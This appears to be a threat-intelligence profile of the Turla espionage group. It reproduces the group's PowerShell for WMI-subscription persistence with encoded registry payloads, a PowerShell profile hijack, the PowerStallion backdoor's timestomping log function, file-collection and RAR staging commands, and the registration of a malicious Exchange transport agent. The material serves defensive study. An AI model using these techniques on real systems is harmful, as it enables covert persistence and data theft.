# Turla

## Features

1. Create two WMI events through PowerShell for persistence, and load PowerShell scripts in the Windows registry using Base64 encoding.

```powershell
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" | Remove-WmiObject;
$NLP35gh = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{name='Syslog Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -enc $HL39fjh";RunInteractively='false'};
//Start process when event is received
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove-WmiObject;
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};
//Register permanent events
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD Bridge'} | Remove-WmiObject;
$IT825cd = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime < 400";
//The normal operation time of the system is between 300 seconds and 400 seconds
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='AD Bridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$VQI79dcf;Consumer=$NLP35gh};
//Create or update WMI instance
```

The Base64 encoded PowerShell script loaded by the variable $HL39fjh is used to read the encrypted stored payload registry key and contain the salt value of the password required to decrypt the payload.

```powershell
[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(Base64 encoded password and salt value)) | iex ;[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) | iex
```

2. Persistence by hijacking PowerShell configuration files.

```powershell
try
{
    $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} |  % {Invoke-WmiMethod -InputObject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-5-18"})
    if ("$SystemProc" -ne "")
    {
      $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append;
      [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("Base64 string")) | iex | Out-Null;
      //Using PowerShell will load the execution statement there
      kill $PID;
    }
}
catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_ </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
```

3. PowerShell lightweight PowerStallion backdoor modifies the modification, access and creation time of local log files through scripts.

```powershell
Function Log ([String]$msg)
{
        [byte[]]$message = [Text.Encoding]::ASCII.GetBytes("[$([DateTime]::Now.ToString('G'))]: $msg `n");
        [byte[]]$cryptedMessage = Crypt $message;
        $LogFilePath = "$WorkingDirectory\desktop.db";  //log file path

        if (-not(Test-Path $LogFilePath))
        {
            Set-Content $LogFilePath -Value $cryptedMessage -Encoding [Coding type];
        }
        elseif ($(Get-Item $LogFilePath).Length -gt 5MB)
        {
            Set-Content $LogFilePath -Value $cryptedMessage -Encoding [Coding type];
        }
        //Write the new contents of the log file. If not, create a new file
        else
        {
            Add-Content $LogFilePath -Value $cryptedMessage -Encoding [Coding type];
        }
        //Add content to the specified log file
        $Ethalon = Get-ChildItem "$($env:PUBLIC)\Documents\desktop.ini" -Force;
        $Target = Get-ChildItem "$WorkingDirectory\desktop.db";
        //Get the files in the current directory file and its subdirectories
        $Target.CreationTime = $Ethalon.CreationTime;  //Creation time
        $Target.LastAccessTime = $Ethalon.LastAccessTime;  //Last visit time
        $Target.LastWriteTime = $Ethalon.LastWriteTime;  //Last write time
}
```

4. After the Crutch malware is delivered, the command will be executed manually to collect the documents of the infected host.

```bash
copy /y \\<redacted>\C$\users\<redacted>\prog\csrftokens.txt c:\programdata\ & dir /x c:\programdata\
copy /y \\<redacted>\C$\users\user\Downloads\FWD___~1.ZIP %temp%\
copy /y \\<redacted>\C$\docume~1\User\My Documents\Downloads\8937.pdf %temp%
"C:\Program Files\WinRAR\Rar.exe" a -hp<redacted> -ri10 -r -y -u -m2 -v30m "%temp%\~res.dat" "d:\<redacted>\*.*" "d:\$RECYCLE.BIN\*.doc*" "d:\$RECYCLE.BIN\*.pdf*" "d:\$RECYCLE.BIN\*.xls*" "d:\Recycled\*.doc*" "d:\Recycled\*.pdf*" "d:\<redacted>\*.pdf"
//Create compressed package
```

5. When the Trojan is delivered to the Exchange service, the malicious DLL file will be executed by registering the Transport Agent function.

```bash
Install-Transportagent -Name "Security Interop Agent" -AssemblyPath "c: \program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll" -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
Install-Transportagent -Name "Content Filter Agent" -AssemblyPath "c: \program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll" -TransportAgentFactory Microsoft.Exchange.Security.Interop.ContentFilterAgentFactory
//Register Transport Agent
Enable-TransportAgent -Identity "Security Interop Agent"
//Enable the transport agent with the specified name
Get-TransportAgent -Identity "Security Interop Agent"
//Gets the Transport Agent with the specified name
Enable-TransportAgent -Identity "Content Filter Agent"
Get-TransportAgent -Identity "Content Filter Agent"
Get-TransportAgent  //Get a list of all Transport Agents
```
